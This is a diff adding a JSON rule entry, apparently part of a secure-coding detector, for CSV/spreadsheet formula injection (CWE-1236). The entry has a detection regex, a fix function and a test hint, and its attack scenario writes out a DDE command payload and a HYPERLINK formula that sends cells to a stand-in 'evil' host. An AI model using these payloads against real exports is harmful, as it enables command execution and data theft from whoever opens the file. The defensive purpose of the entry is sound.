@@ -1,0 +1,31 @@
+{
+  "cwe_id": "CWE-1236",
+  "name": "CSV / Spreadsheet Formula Injection",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "csv",
+    "export",
+    "excel",
+    "spreadsheet",
+    "download",
+    "writerow",
+    "report"
+  ],
+  "patterns": [
+    {
+      "lang": "python",
+      "confidence": "medium",
+      "re": "\\.(?:writerows?|append)\\([^)\\n]*(?:request\\.|req\\.|\\.GET\\b|\\.POST\\b|form\\[|form\\.get|params\\[|user_input)"
+    }
+  ],
+  "attack_scenario": "Attacker sets a profile field to =cmd|'/c calc'!A1 (or =HYPERLINK(\"//evil/\"&A1&A2)); it is exported verbatim into the CSV, and when an admin opens the report Excel fires the DDE payload or silently posts other cells to the attacker's server.",
+  "negative_test_hint": [
+    "export a user whose name field is \"=cmd|'/c calc'!A1\" into the CSV and assert the cell is prefixed with a quote or the value is rejected"
+  ],
+  "exemplar": {
+    "noncompliant": "w = csv.writer(resp)\nw.writerow([request.form[\"name\"], request.form[\"note\"]])",
+    "compliant": "def defuse(c):\n    c = str(c)\n    return \"'\" + c if c[:1] in (\"=\", \"+\", \"-\", \"@\", \"\\t\", \"\\r\") else c\nw = csv.writer(resp)\nw.writerow([defuse(v) for v in row])",
+    "explanation": "A cell beginning with =, +, -, @ (or a tab/CR before them) is evaluated as a formula when the exported CSV/XLSX is opened in Excel or LibreOffice, enabling DDE command execution or silent data exfiltration via HYPERLINK/WEBSERVICE. Prefixing such cells with a quote, or rejecting them before serialization, neutralizes the formula while preserving the visible value."
+  }
+}
